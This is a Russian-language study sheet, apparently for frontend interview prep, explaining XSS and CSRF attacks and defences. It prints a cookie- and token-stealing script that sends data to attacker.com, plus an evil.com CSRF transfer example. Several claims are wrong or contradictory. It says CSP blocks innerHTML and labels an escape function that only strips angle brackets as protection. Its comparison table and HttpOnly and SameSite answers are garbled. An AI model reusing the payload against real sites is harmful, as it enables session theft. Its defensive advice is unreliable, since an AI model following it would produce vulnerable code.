## 🎯 Основные угрозы XSS и CSRF (Frontend Security)

### **🦠 XSS (Cross-Site Scripting)**

**Что это**: Злоумышленник внедряет `<script>` в вашу страницу, который выполняется **в контексте вашего домена**.
Атака, при которой пользовательский ввод недостаточно очищается и внедряется в HTML/JS, что позволяет выполнить произвольный JavaScript в браузере жертвы.

Суть Cross-Site Scripting в том, что приложение допускает внедрение пользовательских данных в HTML или JavaScript без корректного экранирования или валидации. В результате злоумышленник может вставить фрагмент кода, который браузер жертвы воспримет как «родной» скрипт сайта и выполнит его с полномочиями этого сайта: доступ к DOM, к незащищённым cookie, локальному хранилищу, взаимодействие с сервером через уже активную сессию.

#### **Типы XSS**[^1][^2]

| Тип           | Как работает                              | Пример                       | Защита                 |
| :------------ | :---------------------------------------- | :--------------------------- | :--------------------- |
| **Reflected** | `?search=<script>alert(1)</script>` в URL | Фишинг ссылка                | `encodeURIComponent()` |
| **Stored**    | `<script>` в БД → все видят               | Комментарии, профили         | Сервер: `escapeHTML()` |
| **DOM-based** | `document.write(location.hash)`           | `#<script>alert(1)</script>` | НИКОГДА `innerHTML`    |

#### **Последствия XSS**

```
✅ Кража JWT/cookies:      document.cookie → attacker.com
✅ Кража localStorage:     localStorage.getItem('token')
✅ Keylogger:              onkeydown=sendToAttacker()
✅ Redirect:               window.location = 'phishing.com'
✅ Deface:                 document.body.innerHTML = 'HACKED'
```

**Реальный payload**:

```html
<script>
  fetch(
    "https://attacker.com/steal?cookie=" +
      document.cookie +
      "&token=" +
      localStorage.getItem("token"),
  );
</script>
```

### **🔪 CSRF (Cross-Site Request Forgery)**

**Что это**: Злоумышленник заставляет **авторизованного** пользователя выполнить действие на вашем сайте. Атака, при которой злоумышленник заставляет браузер жертвы выполнить нежелательный запрос к сайту, используя уже существующую авторизованную сессию.

CSRF (Cross-Site Request Forgery) использует доверие сервера к браузеру пользователя: если пользователь уже авторизован и его браузер автоматически отправляет cookie сессии, злоумышленник может подставить в свою страницу форму или запрос к целевому сайту. Когда жертва переходит на эту страницу, её браузер отправляет запрос к доверенному сайту вместе с действующей cookie, и сервер воспринимает его как легитимный. Так можно инициировать перевод денег, смену email, изменение пароля и другие критичные действия без явного согласия пользователя. Поэтому защиту строят вокруг проверки, что запрос действительно инициирован с «правильного» origin или содержит корректный CSRF-токен.

#### **Сценарий атаки**

```
1. User авторизован на bank.com (JWT cookie)
2. User заходит на evil.com
3. evil.com: <img src="https://bank.com/transfer?to=attacker&sum=100000">
4. Браузер шлёт GET /transfer + JWT cookie автоматически!
5. 💸 Деньги у attacker'а
```

#### **Типы CSRF**

| Тип      | Пример                                           | Защита                     |
| :------- | :----------------------------------------------- | :------------------------- |
| **GET**  | `<img src="/transfer?to=hacker">`                | НИКОГДА side-effects в GET |
| **POST** | `<form action="/transfer" method="POST"></form>` | CSRF-токен                 |
| **JSON** | `fetch('/api/transfer', {method: 'POST'})`       | `SameSite=Strict`          |

### **⚔️ Сравнение угроз**

| Характеристика            | XSS          | CSRF               |
| :------------------------ | :----------- | :----------------- |
| **Требует авторизации**   | ❌ Нет       | ✅ Да              |
| **Доступ к cookies**      | ✅ Да (всех) | ✅ Только HttpOnly |
| **Доступ к localStorage** | ✅ Да        | ❌ Нет             |
| **Выполняет JS**          | ✅ Да        | ❌ Нет             |
| **Защищает HttpOnly**     | ❌ Нет       | ✅ Да              |
| **Защищает SameSite**     | ❌ Нет       | ✅ Да              |

### **🛡️ Защита (Production 2026)**

#### **1. XSS защита**

Основные практики защиты от XSS включают корректное экранирование и фильтрацию данных в момент вывода (output encoding), а также использование Content Security Policy (CSP). Экранирование гарантирует, что пользовательский ввод будет интерпретирован как текст, а не как HTML/JS-код, например, преобразование < в &lt; в HTML-контексте. CSP позволяет задать строгие правила: запретить inline-скрипты, ограничить источники загрузки скриптов и стилей, требовать использования nonce или hash для разрешённых скриптов. В сумме это серьёзно усложняет внедрение и выполнение произвольного кода злоумышленника, даже если какая-то часть приложения допустила ошибку в обработке данных.

```html
<!-- ❌ Уязвимо -->
<div id="user">${userInput}</div>
<!-- innerHTML -->

<!-- ✅ Безопасно -->
<div id="user"></div>
<script>
  // textContent = безопасно
  document.getElementById("user").textContent = userInput;
</script>
```

**React** (автоматически безопасно):

```jsx
<div>{userInput}</div> // React экранирует!
```

**Express**:

```javascript
app.use((req, res, next) => {
  res.locals.escape = (str) => str.replace(/[<>]/g, "");
  next();
});
```

#### **2. CSRF защита**

Классическая защита от CSRF в stateful-приложениях с cookie выглядит так: сервер генерирует криптографически случайный токен, привязывает его к сессии пользователя и передаёт клиенту (например, в HTML-форме или отдельным endpoint‑ом). При каждом запросе, который может изменить состояние (POST, PUT, DELETE и т.д.), клиент отправляет этот токен в теле формы, в заголовке X-CSRF-Token или другом канале. Сервер проверяет соответствие токена текущей сессии. Поскольку злоумышленник, выполняющий CSRF, не может прочитать содержимое страницы жертвы и не знает токен, ему сложно подделать корректный запрос. В дополнение можно использовать флаг SameSite для cookie и проверку Origin/Referer для усиления защиты.

```javascript
// Express + cookie
app.use((req, res, next) => {
  res.cookie("csrfToken", generateCsrfToken(), {
    httpOnly: false, // Доступен JS
    sameSite: "strict",
  });
  next();
});

// Проверка middleware
const csrfProtection = (req, res, next) => {
  if (req.body.csrfToken !== req.cookies.csrfToken) {
    return res.status(403).json({ error: "CSRF token mismatch" });
  }
  next();
};
```

#### **3. HttpOnly + SameSite (JWT)**

```javascript
res.cookie("token", jwt, {
  httpOnly: true, // ✅ XSS защита
  sameSite: "strict", // ✅ CSRF защита
  secure: true, // ✅ Только HTTPS
});
```

#### **4. CSP (Content Security Policy) - защита от XSS **

Content-Security-Policy позволяет серверу задать политику безопасности контента: откуда можно загружать скрипты (script-src), стили (style-src), изображения (img-src), подключать фреймы и так далее. Например, можно запретить все inline‑скрипты и разрешить только скрипты с определёнными nonce или хешами, а также ограничить источники до собственного домена и доверенного CDN. Это значительно усложняет эксплуатацию XSS, потому что даже если злоумышленник сумеет вставить вредоносный код в страницу, браузер, следуя CSP, откажется его выполнять или загружать. На продвинутых собеседованиях часто ожидают, что кандидат знает базовый синтаксис CSP и пример строгой политики.

```html
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self'; object-src 'none';"
/>
```

**Блокирует**: `<script src="evil.com">`, `eval()`, `innerHTML`

### **🎯 Собес-запросы**

**Q: Зачем HttpOnly cookie если есть XSS?**

```
HttpOnly НЕ защищает от XSS!
XSS получит sessionId из cookie → запрос на сервер → украдет данные
```

**Q: Как CSRF обходит SameSite=Strict?**

```
1. CSRF через iframe (subdomain)
2. User переходит attacker.com → bank.com (открывает вкладку)
3. Cookie уходит с bank.com
```

**Правило**: **HttpOnly+Samesite=защита CSRF, Sanitize input=защита XSS** 🚀
